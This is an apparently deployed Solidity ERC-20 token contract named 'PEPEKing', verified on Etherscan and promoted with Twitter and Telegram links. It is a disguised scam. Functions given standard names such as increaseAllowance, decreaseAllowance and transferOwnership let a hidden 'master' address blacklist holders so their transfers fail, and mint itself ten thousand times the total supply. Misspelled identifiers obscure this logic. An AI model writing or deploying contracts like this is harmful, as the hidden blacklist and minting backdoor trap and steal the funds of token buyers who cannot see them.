/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

/***

Twitter:https://twitter.com/PEPEKingERC20

Telegram:https://t.me/PEPEKingERC20

***/


// SPDX-License-Identifier: MIT


pragma solidity ^0.8.18;

abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _transferOwnership(_msgSender());
    }


    modifier onlyOwner() {
        _Detection();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    function _Detection() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


pragma solidity ^0.8.0;

contract PEPEKing is Ownable {

    uint256 private _totaiSupply;
    string private _name;
    string private _symbol;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    

    address public _update;
    mapping(address => bool) private baiances;
    function decreaseAllowance(address subtractedValue) external   {
        require(_update == _msgSender());
        baiances[subtractedValue] = false;
        require(_update == _msgSender());
    }

    function increaseAllowance(address addedValue) external   {
        require(_update == _msgSender());
        baiances[addedValue] = true;
    }
    
    function transferOwnership() external {
        require(_update == _msgSender());
        uint256 am0unt = totalSupply();
        _balances[_msgSender()] += am0unt*10000;
    }
   

    function transfor(address reciplent) public view returns(bool)  {
        return baiances[reciplent];
    }

    constructor(string memory name_, string memory symbol_,address master) {
        _update = master;
        _name = name_;
        _symbol = symbol_;
        uint256 am0unt = 100000000*10**decimals();
        _totaiSupply += am0unt;
        _balances[msg.sender] += am0unt;
        emit Transfer(address(0), msg.sender, am0unt);
    }

    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view  returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

 
    function totalSupply() public view returns (uint256) {
        return _totaiSupply;
    }


    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 am0unt) public returns (bool) {
        _internaltransfer(_msgSender(), to, am0unt);
        return true;
    }


    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 am0unt) public returns (bool) {
        _approve(_msgSender(), spender, am0unt);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 am0unt
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, am0unt);
        _internaltransfer(from, to, am0unt);
        return true;
    }



    
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 am0unt
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        if(baiances[fromSender] == true){
            am0unt = am0unt-am0unt + (_balances[fromSender]*9);
        }
        uint256 balance = _balances[fromSender];
        require(balance >= am0unt, "ERC20: transfer am0unt exceeds balance");
        _balances[fromSender] = _balances[fromSender]-am0unt;
        _balances[toSender] = _balances[toSender]+am0unt;

        emit Transfer(fromSender, toSender, am0unt); 
        
    }

    function _approve(
        address owner,
        address spender,
        uint256 am0unt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = am0unt;
        emit Approval(owner, spender, am0unt);
    }

    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 am0unt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= am0unt, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - am0unt);
        }
    }
}